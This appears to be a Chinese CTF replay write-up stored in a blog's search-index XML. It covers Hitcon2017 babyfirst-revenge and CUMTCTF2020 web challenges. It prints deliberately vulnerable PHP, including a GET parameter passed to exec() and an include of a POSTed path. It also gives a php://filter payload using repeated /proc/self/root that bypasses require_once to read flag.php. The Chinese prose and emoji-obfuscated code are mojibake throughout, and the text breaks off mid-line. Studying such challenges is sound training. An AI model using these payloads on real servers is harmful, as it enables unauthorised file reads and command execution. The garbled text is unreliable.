<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>å¤ç°wp</title>
    <url>/2099/09/28/%E5%A4%8D%E7%8E%B0wp/</url>
    <content><![CDATA[<a id="more"></a>
<h2 id="Hitcon2017-babyfirst-reveng"><a href="#Hitcon2017-babyfirst-reveng" class="headerlink" title="Hitcon2017 babyfirst-reveng"></a>Hitcon2017 babyfirst-reveng</h2><p>githubå¤ç°åœ°å€</p>
<p><a href="https://github.com/t3hp0rP/hitconDockerfile/tree/master/hitcon-ctf-2017/babyfirst-revenge" target="_blank" rel="noopener">https://github.com/t3hp0rP/hitconDockerfile/tree/master/hitcon-ctf-2017/babyfirst-revenge</a></p>
<h3 id="è€ƒç‚¹"><a href="#è€ƒç‚¹" class="headerlink" title="è€ƒç‚¹"></a>è€ƒç‚¹</h3><p>å‘½ä»¤æ‰§è¡Œæ„é€ åå¼¹shell</p>
<p>æºç å¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $sandbox = <span class="string">'/www/sandbox/'</span> . md5(<span class="string">"orange"</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    @chdir($sandbox);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>]) &amp;&amp; strlen($_GET[<span class="string">'cmd'</span>]) &lt;= <span class="number">5</span>) &#123;</span><br><span class="line">        @exec($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'reset'</span>])) &#123;</span><br><span class="line">        @exec(<span class="string">'/bin/rm -rf '</span> . $sandbox);</span><br><span class="line">    &#125;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
<p>å…ˆè¯´å‡ ä¸ªçŸ¥è¯†ç‚¹ï¼š</p>
<blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;e\</span><br><span class="line">&gt;cho\</span><br><span class="line">&#39;123&#39;</span><br><span class="line">&gt;123</span><br></pre></td></tr></table></figure>
<p>åœ¨linuxä¸­æ¢è¡Œå¯ä»¥æ‰§è¡Œé—´æ–­çš„å‘½ä»¤</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash">root@kali:~<span class="comment"># vi 1  //åœ¨1ä¸‹å†™å…¥cat flag.txt</span></span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">root@kali:~<span class="comment"># touch flag.txt</span></span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">root@kali:~<span class="comment"># echo "cumtctf&#123;i_am_so_cute&#125;" &gt;&gt; flag.txt</span></span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">root@kali:~<span class="comment"># cat flag.txt</span></span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">cumtctf&#123;i_am_so_cute&#125;</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">root@kali:~<span class="comment"># sh 1</span></span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">cumtctf&#123;i_am_so_cute&#125;</span></span><br></pre></td></tr></table></figure>
<p>åœ¨Linuxä¸‹é¢å¯ä»¥é€šè¿‡å†™å…¥ä¸€ä¸ªæ–‡ä»¶ï¼Œæ–‡ä»¶é‡Œé¢çš„å†…å®¹æ˜¯ç³»ç»Ÿå‘½ä»¤ï¼Œç„¶åå¯ä»¥é€šè¿‡<code>sh filename</code>æ¥æ‰§è¡Œæ–‡æœ¬é‡Œé¢çš„ç³»ç»Ÿå‘½ä»¤ï¼Œå¦‚æœæœ‰æŠ¥é”™çš„è¯ä¼šè‡ªåŠ¨è·³è¿‡</p>
</blockquote>
<h1 id="CUMTCTF2020"><a href="#CUMTCTF2020" class="headerlink" title="CUMTCTF2020"></a>CUMTCTF2020</h1><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="ç®€å•çš„æ–‡ä»¶åŒ…å«ï¼Ÿ"><a href="#ç®€å•çš„æ–‡ä»¶åŒ…å«ï¼Ÿ" class="headerlink" title="ç®€å•çš„æ–‡ä»¶åŒ…å«ï¼Ÿ"></a>ç®€å•çš„æ–‡ä»¶åŒ…å«ï¼Ÿ</h2><h3 id="è€ƒç‚¹-1"><a href="#è€ƒç‚¹-1" class="headerlink" title="è€ƒç‚¹"></a>è€ƒç‚¹</h3><p>require_onceç»•è¿‡</p>
<p>æºç å¦‚ä¸‹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">'HTTP_CLIENT_IP'</span>] != <span class="string">'127.0.0.1'</span> &amp;&amp; $_SERVER[<span class="string">'HTTP_X_REAL_IP'</span>] != <span class="string">'127.0.0.1'</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> ($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>] == <span class="string">"127.0.0.1"</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Do u think that I dont know X-Forwarded-For?&lt;br&gt;Too young too simple sometimes naive"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Sorry, this site is only optimized for those who comes from localhost"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">"flag.php"</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'f'</span>])) </span><br><span class="line">  <span class="keyword">include_once</span>($_POST[<span class="string">'f'</span>]);</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œä¸»è¦é—®é¢˜æ˜¯<code>reuqire_once</code>çš„é—®é¢˜</p>
<p><a href="https://www.anquanke.com/post/id/213235#h3-2" target="_blank" rel="noopener">https://www.anquanke.com/post/id/213235#h3-2</a></p>
<p>è¿™é‡Œé¢çš„æºç è§£ææœ‰å¾—è¿˜æ˜¯çœ‹ä¸æ‡‚ï¼Œæ—¥åå†ç¿»</p>
<p>é¦–å…ˆè¯´ä¸€ä¸‹phpæ–‡ä»¶åŒ…å«çš„æœºåˆ¶æ˜¯å°†<strong>å·²ç»åŒ…å«çš„æ–‡ä»¶ä¸æ–‡ä»¶çš„çœŸå®è·¯å¾„æ”¾è¿›å“ˆå¸Œè¡¨ä¸­</strong>ï¼Œå½“å·²ç»<code>require_once(&#39;flag.php&#39;)</code>ï¼Œå·²ç»includeçš„æ–‡ä»¶ä¸å¯ä»¥å†<code>require_once</code>ã€‚</p>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php</span><br></pre></td></tr></table></figure>
<blockquote>
<p>/proc/selfæŒ‡å‘å½“å‰è¿›ç¨‹çš„/proc/pid/</p>
<p>/proc/self/root/æŒ‡å‘/çš„ç¬¦å·</p>
<p><img src="/2099/09/28/%E5%A4%8D%E7%8E%B0wp/image-20200928111221260.png" alt></p>
</blockquote>
<h2 id="ğŸ‘ğŸ™ŒğŸ˜ƒ"><a href="#ğŸ‘ğŸ™ŒğŸ˜ƒ" class="headerlink" title="ğŸ‘ğŸ™ŒğŸ˜ƒ"></a>ğŸ‘ğŸ™ŒğŸ˜ƒ</h2><h3 id="è€ƒç‚¹-2"><a href="#è€ƒç‚¹-2" class="headerlink" title="è€ƒç‚¹"></a>è€ƒç‚¹</h3><p>ä»£ç æ ¼å¼åŒ–ã€åæ··æ·†ï¼Œbcryptçˆ†ç ´ï¼Œ<strong>å‘½ä»¤æ‰§è¡Œ</strong></p>
<p>è¿™ä¸ªé¢˜ æˆ‘åªèƒ½è¯´çœŸçš„ç‰›é€¼</p>
<p>çœŸçš„å¼€çœ¼ç•Œ è¿˜å¯ä»¥è¿™æ ·</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'vendor/autoload.php'</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Bcrypt</span>\<span class="title">Bcrypt</span>;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">ini_set(<span class="string">"display_errors"</span>,<span class="string">"Off"</span>);</span><br><span class="line">$ğŸ™=<span class="keyword">array</span>(<span class="string">'ğŸ™'</span>,<span class="string">'ğŸ™‘'</span>,<span class="string">'ğŸ™’'</span>,<span class="string">'ğŸ™“'</span>,<span class="string">'ğŸ™”'</span>,<span class="string">'ğŸ™•'</span>,<span class="string">'ğŸ™–'</span>,<span class="string">'ğŸ™—'</span>,<span class="string">'ğŸ™˜'</span>,<span class="string">'ğŸ™™'</span>,<span class="string">'ğŸ™š'</span>,<span class="string">'ğŸ™›'</span>,<span class="string">'ğŸ™œ'</span>,<span class="string">'ğŸ™'</span>,<span class="string">'ğŸ™'</span>,<span class="string">'ğŸ™Ÿ'</span>);</span><br><span class="line">$ğŸ™ =<span class="keyword">array</span>(<span class="string">'ğŸ™ '</span>,<span class="string">'ğŸ™¡'</span>,<span class="string">'ğŸ™¢'</span>,<span class="string">'ğŸ™£'</span>,<span class="string">'ğŸ™¤'</span>,<span class="string">'ğŸ™¥'</span>,<span class="string">'ğŸ™¦'</span>,<span class="string">'ğŸ™§'</span>,<span class="string">'ğŸ™¨'</span>,<span class="string">'ğŸ™©'</span>,<span class="string">'ğŸ™ª'</span>,<span class="string">'ğŸ™«'</span>,<span class="string">'ğŸ™¬'</span>,<span class="string">'ğŸ™­'</span>,<span class="string">'ğŸ™®'</span>,<span class="string">'ğŸ™¯'</span>);</span><br><span class="line">$ğŸ™°=<span class="keyword">array</span>(<span class="string">'ğŸ™°'</span>,<span class="string">'ğŸ™±'</span>,<span class="string">'ğŸ™²'</span>,<span class="string">'ğŸ™³'</span>,<span class="string">'ğŸ™´'</span>,<span class="string">'ğŸ™µ'</span>,<span class="string">'ğŸ™¶'</span>,<span class="string">'ğŸ™·'</span>,<span class="string">'ğŸ™¸'</span>,<span class="string">'ğŸ™¹'</span>,<span class="string">'ğŸ™º'</span>,<span class="string">'ğŸ™»'</span>,<span class="string">'ğŸ™¼'</span>,<span class="string">'ğŸ™½'</span>,<span class="string">'ğŸ™¾'</span>,<span class="string">'ğŸ™¿'</span>);</span><br><span class="line">$ğŸ˜€=<span class="keyword">array</span>(<span class="string">'ğŸ˜€'</span>,<span class="string">'ğŸ˜'</span>,<span class="string">'ğŸ˜‚'</span>,<span class="string">'ğŸ˜ƒ'</span>,<span class="string">'ğŸ˜„'</span>,<span class="string">'ğŸ˜…'</span>,<span class="string">'ğŸ˜†'</span>,<span class="string">'ğŸ˜‡'</span>,<span class="string">'ğŸ˜ˆ'</span>,<span class="string">'ğŸ˜‰'</span>,<span class="string">'ğŸ˜Š'</span>,<span class="string">'ğŸ˜‹'</span>,<span class="string">'ğŸ˜Œ'</span>,<span class="string">'ğŸ˜'</span>,<span class="string">'ğŸ˜'</span>,<span class="string">'ğŸ˜'</span>);</span><br><span class="line">$ğŸ˜=<span class="keyword">array</span>(<span class="string">'ğŸ˜'</span>,<span class="string">'ğŸ˜‘'</span>,<span class="string">'ğŸ˜’'</span>,<span class="string">'ğŸ˜“'</span>,<span class="string">'ğŸ˜”'</span>,<span class="string">'ğŸ˜•'</span>,<span class="string">'ğŸ˜–'</span>,<span class="string">'ğŸ˜—'</span>,<span class="string">'ğŸ˜˜'</span>,<span class="string">'ğŸ˜™'</span>,<span class="string">'ğŸ˜š'</span>,<span class="string">'ğŸ˜›'</span>,<span class="string">'ğŸ˜œ'</span>,<span class="string">'ğŸ˜'</span>,<span class="string">'ğŸ˜'</span>,<span class="string">'ğŸ˜Ÿ'</span>);</span><br><span class="line">$ğŸ˜ =<span class="keyword">array</span>(<span class="string">'ğŸ˜ '</span>,<span class="string">'ğŸ˜¡'</span>,<span class="string">'ğŸ˜¢'</span>,<span class="string">'ğŸ˜£'</span>,<span class="string">'ğŸ˜¤'</span>,<span class="string">'ğŸ˜¥'</span>,<span class="string">'ğŸ˜¦'</span>,<span class="string">'ğŸ˜§'</span>,<span class="string">'ğŸ˜¨'</span>,<span class="string">'ğŸ˜©'</span>,<span class="string">'ğŸ˜ª'</span>,<span class="string">'ğŸ˜«'</span>,<span class="string">'ğŸ˜¬'</span>,<span class="string">'ğŸ˜­'</span>,<span class="string">'ğŸ˜®'</span>,<span class="string">'ğŸ˜¯'</span>);</span><br><span class="line">$ğŸ˜°=<span class="keyword">array</span>(<span class="string">'ğŸ˜°'</span>,<span class="string">'ğŸ˜±'</span>,<span class="string">'ğŸ˜²'</span>,<span class="string">'ğŸ˜³'</span>,<span class="string">'ğŸ˜´'</span>,<span class="string">'ğŸ˜µ'</span>,<span class="string">'ğŸ˜¶'</span>,<span class="string">'ğŸ˜·'</span>,<span class="string">'ğŸ˜¸'</span>,<span class="string">'ğŸ˜¹'</span>,<span class="string">'ğŸ˜º'</span>,<span class="string">'ğŸ˜»'</span>,<span class="string">'ğŸ˜¼'</span>,<span class="string">'ğŸ˜½'</span>,<span class="string">'ğŸ˜¾'</span>,<span class="string">'ğŸ˜¿'</span>);</span><br><span class="line">$ğŸ™€=<span class="keyword">array</span>(<span class="string">'ğŸ™€'</span>,<span class="string">'ğŸ™'</span>,<span class="string">'ğŸ™‚'</span>,<span class="string">'ğŸ™ƒ'</span>,<span class="string">'ğŸ™„'</span>,<span class="string">'ğŸ™…'</span>,<span class="string">'ğŸ™†'</span>,<span class="string">'ğŸ™‡'</span>,<span class="string">'ğŸ™ˆ'</span>,<span class="string">'ğŸ™‰'</span>,<span class="string">'ğŸ™Š'</span>,<span class="string">'ğŸ™‹'</span>,<span class="string">'ğŸ™Œ'</span>,<span class="string">'ğŸ™'</span>,<span class="string">'ğŸ™'</span>,<span class="string">'ğŸ™'</span>);</span><br><span class="line">$ğŸ = <span class="keyword">array</span>($ğŸ™ ,$ğŸ™ ,$ğŸ™°,$ğŸ˜€,$ğŸ˜,$ğŸ˜ ,$ğŸ˜°,$ğŸ™€);</span><br><span class="line">$ğŸ˜³ğŸ˜ƒğŸ˜¢ğŸ™‰ğŸ˜²ğŸ˜—ğŸ˜¦ğŸ™… = <span class="string">"strlen"</span>;</span><br><span class="line">$ğŸ˜©ğŸ˜‚ğŸ˜¸ğŸ™‰ = <span class="string">"chr"</span>;</span><br><span class="line">$ğŸ = <span class="string">"base64_decode"</span>;</span><br><span class="line">$ğŸ˜±ğŸ˜¨ğŸ˜ğŸ™ŠğŸ˜ªğŸ˜¨ğŸ˜¡ğŸ˜ = <span class="string">"isset"</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> ğŸ˜ªğŸ˜—ğŸ˜¦ğŸ˜ºğŸ˜²ğŸ˜‚ğŸ˜¢ğŸ˜¼<span class="params">($ğŸ˜³ğŸ˜ƒğŸ˜¢ğŸ™‰)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">global</span> $ğŸ,$ğŸ˜³ğŸ˜ƒğŸ˜¢ğŸ™‰ğŸ˜²ğŸ˜—ğŸ˜¦ğŸ™…,$ğŸ˜©ğŸ˜‚ğŸ˜¸ğŸ™‰,$ğŸ,$ğŸ˜±ğŸ˜¨ğŸ˜ğŸ™ŠğŸ˜ªğŸ˜¨ğŸ˜¡ğŸ˜;</span><br><span class="line">	$ğŸ˜²ğŸ˜—ğŸ˜¦ğŸ™…= (<span class="string">"$ğŸ˜³ğŸ˜ƒğŸ˜¢ğŸ™‰ğŸ˜²ğŸ˜—ğŸ˜¦ğŸ™…"</span>)($ğŸ˜³ğŸ˜ƒğŸ˜¢ğŸ™‰)/<span class="number">4</span>;</span><br><span class="line">	$ğŸ˜³ğŸ˜‚ğŸ˜šğŸ˜¼ = <span class="string">""</span>;</span><br><span class="line">	<span class="keyword">for</span> ($ğŸ˜±ğŸ˜§ğŸ˜¼ğŸ™€ = <span class="number">0</span>;$ğŸ˜±ğŸ˜§ğŸ˜¼ğŸ™€&lt;$ğŸ˜²ğŸ˜—ğŸ˜¦ğŸ™…;$ğŸ˜±ğŸ˜§ğŸ˜¼ğŸ™€++) &#123;</span><br><span class="line">		$ğŸ˜©ğŸ˜‚ğŸ˜¦ğŸ™ƒ =$ğŸ˜³ğŸ˜ƒğŸ˜¢ğŸ™‰[$ğŸ˜±ğŸ˜§ğŸ˜¼ğŸ™€*<span class="number">4</span>].$ğŸ˜³ğŸ˜ƒğŸ˜¢ğŸ™‰[$ğŸ˜±ğŸ˜§ğŸ˜¼ğŸ™€*<span class="number">4</span>+<span class="number">1</span>].$ğŸ˜³ğŸ˜ƒğŸ˜¢ğŸ™‰[$ğŸ˜±ğŸ˜§ğŸ˜¼ğŸ™€*<span class="number">4</span>+<span class="number">2</span>].$ğŸ˜³ğŸ˜ƒğŸ˜¢ğŸ™‰[$ğŸ˜±ğŸ˜§ğŸ˜¼ğŸ™€*<span class="number">4</span>+<span class="number">3</span>];</span><br><span class="line">		$ğŸ˜ªğŸ˜¾ğŸ˜ğŸ˜€ =<span class="number">0</span>;</span><br><span class="line">		$ğŸ˜³ğŸ˜‚ğŸ˜¦ğŸ˜º =<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> ($ğŸ˜±ğŸ˜½ğŸ™€ğŸ™ =<span class="number">0</span>;$ğŸ˜±ğŸ˜½ğŸ™€ğŸ™&lt;<span class="number">8</span>;$ğŸ˜±ğŸ˜½ğŸ™€ğŸ™++) &#123;</span><br><span class="line">			<span class="keyword">for</span> ($ğŸ˜±ğŸ˜‚ğŸ™„ğŸ™‚=<span class="number">0</span>;$ğŸ˜±ğŸ˜‚ğŸ™„ğŸ™‚&lt;<span class="number">16</span>;$ğŸ˜±ğŸ˜‚ğŸ™„ğŸ™‚++) &#123;</span><br><span class="line">				<span class="keyword">if</span>($ğŸ˜©ğŸ˜‚ğŸ˜¦ğŸ™ƒ == $ğŸ[$ğŸ˜±ğŸ˜½ğŸ™€ğŸ™][$ğŸ˜±ğŸ˜‚ğŸ™„ğŸ™‚]) &#123;</span><br><span class="line">					$ğŸ˜ªğŸ˜¾ğŸ˜ğŸ˜€=$ğŸ˜±ğŸ˜½ğŸ™€ğŸ™;</span><br><span class="line">					$ğŸ˜³ğŸ˜‚ğŸ˜¦ğŸ˜º = $ğŸ˜±ğŸ˜‚ğŸ™„ğŸ™‚;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		$ğŸ˜²ğŸ˜¾ğŸ˜¦ğŸ™„ = $ğŸ˜ªğŸ˜¾ğŸ˜ğŸ˜€*<span class="number">16</span>+$ğŸ˜³ğŸ˜‚ğŸ˜¦ğŸ˜º;</span><br><span class="line">		$ğŸ˜³ğŸ˜‚ğŸ˜šğŸ˜¼ = $ğŸ˜³ğŸ˜‚ğŸ˜šğŸ˜¼.(<span class="string">"$ğŸ˜©ğŸ˜‚ğŸ˜¸ğŸ™‰"</span>)($ğŸ˜²ğŸ˜¾ğŸ˜¦ğŸ™„);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> (<span class="string">"$ğŸ"</span>)($ğŸ˜³ğŸ˜‚ğŸ˜šğŸ˜¼);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> ğŸ˜ğŸ˜<span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">global</span> $ğŸ,$ğŸ˜³ğŸ˜ƒğŸ˜¢ğŸ™‰ğŸ˜²ğŸ˜—ğŸ˜¦ğŸ™…,$ğŸ˜©ğŸ˜‚ğŸ˜¸ğŸ™‰,$ğŸ,$ğŸ˜±ğŸ˜¨ğŸ˜ğŸ™ŠğŸ˜ªğŸ˜¨ğŸ˜¡ğŸ˜;</span><br><span class="line">	$ğŸ˜³ğŸ˜‚ğŸ˜–ğŸ™…ğŸ˜ªğŸ˜—ğŸ˜š = ğŸ˜ªğŸ˜—ğŸ˜¦ğŸ˜ºğŸ˜²ğŸ˜‚ğŸ˜¢ğŸ˜¼(ğŸ˜œğŸ˜ƒğŸ˜ªğŸ˜¸ğŸ˜³ğŸ˜¹ğŸ˜‰ğŸ˜ƒğŸ˜´ğŸ˜ƒğŸ˜³ğŸ™†ğŸ˜±ğŸ˜˜ğŸ˜¢ğŸ™„ğŸ˜²ğŸ˜“ğŸ˜‰ğŸ™ŠğŸ˜©ğŸ˜§ğŸ˜…ğŸ˜»ğŸ˜©ğŸ˜½ğŸ˜‰ğŸ˜„ğŸ˜œğŸ™‡ğŸ˜ğŸ˜).ğŸ˜ªğŸ˜—ğŸ˜¦ğŸ˜ºğŸ˜²ğŸ˜‚ğŸ˜¢ğŸ˜¼(ğŸ˜²ğŸ˜§ğŸ˜¡ğŸ˜)($_SERVER[ğŸ˜ªğŸ˜—ğŸ˜¦ğŸ˜ºğŸ˜²ğŸ˜‚ğŸ˜¢ğŸ˜¼(ğŸ˜¥ğŸ˜»ğŸ˜¦ğŸ˜ğŸ˜¤ğŸ˜ğŸ˜¢ğŸ˜–ğŸ˜¨ğŸ˜€ğŸ˜–ğŸ˜•ğŸ˜¢ğŸ˜–ğŸ˜™ğŸ˜)]);</span><br><span class="line">	ğŸ˜ªğŸ˜—ğŸ˜¦ğŸ˜ºğŸ˜²ğŸ˜‚ğŸ˜¢ğŸ˜¼(ğŸ˜²ğŸ˜§ğŸ™„ğŸ˜»ğŸ˜±ğŸ˜¨ğŸ˜™ğŸ˜)($ğŸ˜³ğŸ˜‚ğŸ˜–ğŸ™…ğŸ˜ªğŸ˜—ğŸ˜š);</span><br><span class="line">	ğŸ˜ªğŸ˜—ğŸ˜¦ğŸ˜ºğŸ˜²ğŸ˜‚ğŸ˜¢ğŸ˜¼(ğŸ˜©ğŸ˜‚ğŸ˜¸ğŸ˜»ğŸ˜±ğŸ˜¨ğŸ˜™ğŸ˜)($ğŸ˜³ğŸ˜‚ğŸ˜–ğŸ™…ğŸ˜ªğŸ˜—ğŸ˜š);</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[ğŸ˜ªğŸ˜—ğŸ˜¦ğŸ˜ºğŸ˜²ğŸ˜‚ğŸ˜¢ğŸ˜¼(ğŸ˜©ğŸ˜‚ğŸ˜ğŸ˜»)]) &amp;&amp; ($ğŸ˜³ğŸ˜ƒğŸ˜¢ğŸ™‰ğŸ˜²ğŸ˜—ğŸ˜¦ğŸ™…)($_GET[ğŸ˜ªğŸ˜—ğŸ˜¦ğŸ˜ºğŸ˜²ğŸ˜‚ğŸ˜¢ğŸ˜¼(ğŸ˜©ğŸ˜‚ğŸ˜ğŸ˜»)]) &lt;= <span class="number">5</span>) &#123;</span><br><span class="line">		@ğŸ˜ªğŸ˜—ğŸ˜¦ğŸ˜ºğŸ˜²ğŸ˜‚ğŸ˜¢ğŸ˜¼(ğŸ˜ªğŸ˜¨ğŸ˜¸ğŸ˜¼ğŸ˜©ğŸ™‡ğŸ˜ğŸ˜)($_GET[ğŸ˜ªğŸ˜—ğŸ˜¦ğŸ˜ºğŸ˜²ğŸ˜‚ğŸ˜¢ğŸ˜¼(ğŸ˜©ğŸ˜‚ğŸ˜ğŸ˜»)]);</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[ğŸ˜ªğŸ˜—ğŸ˜¦ğŸ˜ºğŸ˜²ğŸ˜‚ğŸ˜¢ğŸ˜¼(ğŸ˜³ğŸ˜½ğŸ˜¦ğŸ™ŠğŸ˜ªğŸ˜¨ğŸ˜¡ğŸ˜)])) &#123;</span><br><span class="line">		@ğŸ˜ªğŸ˜—ğŸ˜¦ğŸ˜ºğŸ˜²ğŸ˜‚ğŸ˜¢ğŸ˜¼(ğŸ˜ªğŸ˜¨ğŸ˜¸ğŸ˜¼ğŸ˜©ğŸ™‡ğŸ˜ğŸ˜)(ğŸ˜ªğŸ˜—ğŸ˜¦ğŸ˜ºğŸ˜²ğŸ˜‚ğŸ˜¢ğŸ˜¼(ğŸ˜³ğŸ˜½ğŸ˜€ğŸ˜·ğŸ˜œğŸ˜¨ğŸ˜šğŸ˜½ğŸ˜™ğŸ˜‘ğŸ˜ğŸ˜) . $ğŸ˜³ğŸ˜‚ğŸ˜–ğŸ™…ğŸ˜ªğŸ˜—ğŸ˜š);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$ğŸ¯ = <span class="keyword">new</span> Bcrypt();</span><br><span class="line">$ğŸ”‘ = $_POST[ğŸ˜ªğŸ˜—ğŸ˜¦ğŸ˜ºğŸ˜²ğŸ˜‚ğŸ˜¢ğŸ˜¼(ğŸ˜³ğŸ˜—ğŸ˜–ğŸ™ŠğŸ˜³ğŸ˜ƒğŸ˜´ğŸ˜»)];</span><br><span class="line">$ğŸ”’ = ğŸ˜ªğŸ˜—ğŸ˜¦ğŸ˜ºğŸ˜²ğŸ˜‚ğŸ˜¢ğŸ˜¼(ğŸ˜šğŸ˜”ğŸ˜šğŸ˜…ğŸ˜šğŸ˜”ğŸ˜•ğŸ™‡ğŸ˜šğŸ˜–ğŸ˜šğŸ˜“ğŸ˜ªğŸ˜½ğŸ˜»ğŸ˜„ğŸ˜¥ğŸ˜¨ğŸ˜’ğŸ˜›ğŸ˜£ğŸ˜¼ğŸ˜–ğŸ˜¢ğŸ˜²ğŸ˜¥ğŸ™€ğŸ˜•ğŸ˜ğŸ˜»ğŸ˜ªğŸ˜…ğŸ˜²ğŸ˜˜ğŸ˜¦ğŸ™‰ğŸ˜£ğŸ˜½ğŸ˜¦ğŸ™ˆğŸ˜²ğŸ˜¦ğŸ˜‘ğŸ™…ğŸ˜ğŸ˜½ğŸ˜ğŸ˜ğŸ˜²ğŸ˜ºğŸ˜´ğŸ˜€ğŸ˜ªğŸ˜—ğŸ˜‰ğŸ˜œğŸ˜©ğŸ˜ƒğŸ™€ğŸ˜ğŸ˜ğŸ˜¾ğŸ˜©ğŸ˜…ğŸ˜±ğŸ˜–ğŸ˜ğŸ˜ºğŸ˜ªğŸ˜”ğŸ˜¼ğŸ˜†ğŸ˜¢ğŸ˜—ğŸ˜¿ğŸ™ŠğŸ˜´ğŸ˜ğŸ˜¸ğŸ˜¼);</span><br><span class="line"><span class="keyword">if</span>($ğŸ¯-&gt;verify($ğŸ”‘, $ğŸ”’)) &#123;</span><br><span class="line">	<span class="keyword">echo</span>(ğŸ˜ªğŸ˜—ğŸ˜¦ğŸ˜ºğŸ˜²ğŸ˜‚ğŸ˜¢ğŸ˜¼(ğŸ˜ ğŸ˜“ğŸ˜‰ğŸ˜¹ğŸ˜³ğŸ˜ºğŸ˜…ğŸ˜¡ğŸ˜©ğŸ˜¨ğŸ˜ğŸ™ŠğŸ˜´ğŸ˜‚ğŸ˜‰ğŸ™‰ğŸ˜ªğŸ˜“ğŸ˜’ğŸ˜‚ğŸ˜ªğŸ˜¨ğŸ˜šğŸ™€ğŸ˜ªğŸ˜½ğŸ˜¼ğŸ˜¼ğŸ˜ªğŸ˜“ğŸ˜•ğŸ˜ˆğŸ˜œğŸ˜‚ğŸ˜šğŸ™‰ğŸ˜ ğŸ˜·ğŸ˜ğŸ˜));</span><br><span class="line">	<span class="keyword">echo</span>(ğŸ˜ªğŸ˜—ğŸ˜¦ğŸ˜ºğŸ˜²ğŸ˜‚ğŸ˜¢ğŸ˜¼(ğŸ˜¦ğŸ˜‚ğŸ˜‰ğŸ˜ƒğŸ˜™ğŸ˜£ğŸ˜–ğŸ˜ŸğŸ˜²ğŸ˜ƒğŸ˜³ğŸ™ƒğŸ˜±ğŸ˜—ğŸ˜–ğŸ˜ºğŸ˜±ğŸ™‰ğŸ˜’ğŸ™€ğŸ˜´ğŸ˜“ğŸ˜•ğŸ˜ˆğŸ˜œğŸ˜‚ğŸ˜šğŸ™‰ğŸ˜ ğŸ˜·ğŸ˜ğŸ˜));</span><br><span class="line">	ğŸ˜ğŸ˜();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="keyword">echo</span>(ğŸ˜ªğŸ˜—ğŸ˜¦ğŸ˜ºğŸ˜²ğŸ˜‚ğŸ˜¢ğŸ˜¼(ğŸ˜ 